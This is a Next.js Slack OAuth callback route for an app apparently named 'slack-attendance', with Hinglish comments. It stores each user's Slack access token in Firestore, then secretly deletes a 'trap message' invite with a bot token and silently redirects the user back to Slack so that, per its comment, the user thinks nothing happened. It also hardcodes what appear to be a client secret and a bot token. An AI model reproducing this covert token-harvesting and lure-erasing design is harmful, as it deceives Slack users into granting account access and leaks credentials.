// app/api/auth/callback/route.ts
import { NextResponse } from 'next/server';
import { db } from '../../../../lib/firebase';
import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';

const SLACK_CLIENT_ID = "2545190050563.10491030504784";
const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; // Message delete karne ke liye Bot Token chahiye

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const code = searchParams.get('code');

  if (!code) return NextResponse.json({ error: "No code" });

  try {
    // 1. Token Exchange
    const formData = new URLSearchParams();
    formData.append('client_id', SLACK_CLIENT_ID);
    formData.append('client_secret', SLACK_CLIENT_SECRET);
    formData.append('code', code);
    formData.append('redirect_uri', REDIRECT_URI);

    const response = await fetch('https://slack.com/api/oauth.v2.access', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData
    });

    const data = await response.json();
    if (!data.ok) return NextResponse.json({ error: data.error }, { status: 400 });

    const userId = data.authed_user.id;

    // 2. Save User Token
    const userRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
        headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
    });
    const userInfo = await userRes.json();
    
    await setDoc(doc(db, "slack_tokens", userId), {
        slackId: userId,
        accessToken: data.authed_user.access_token,
        name: userInfo.user?.real_name || "Unknown",
        image: userInfo.user?.profile?.image_192 || "",
        connectedAt: serverTimestamp(),
    });

    // 3. 🗑️ DELETE THE TRAP MESSAGE (Secretly)
    // Check agar koi pending invite tha
    const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
    
    if (inviteDoc.exists()) {
        const inviteData = inviteDoc.data();
        
        // Slack se message delete karo
        await fetch('https://slack.com/api/chat.delete', {
            method: 'POST',
            headers: { 
                Authorization: `Bearer ${BOT_TOKEN}`, // Bot delete karega
                'Content-Type': 'application/json' 
            },
            body: JSON.stringify({
                channel: inviteData.channel,
                ts: inviteData.ts
            })
        });

        // Record saaf kar do
        await deleteDoc(doc(db, "pending_invites", userId));
    }

    // 4. Redirect to Slack App (User ko lagega kuch hua hi nahi)
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta http-equiv="refresh" content="0;url=slack://open">
          <script>window.location.href = 'slack://open'; window.close();</script>
        </head>
        <body></body>
      </html>
    `;

    return new Response(html, { headers: { 'Content-Type': 'text/html' } });

  } catch (error) {
    return NextResponse.json({ error: "Error" }, { status: 500 });
  }
}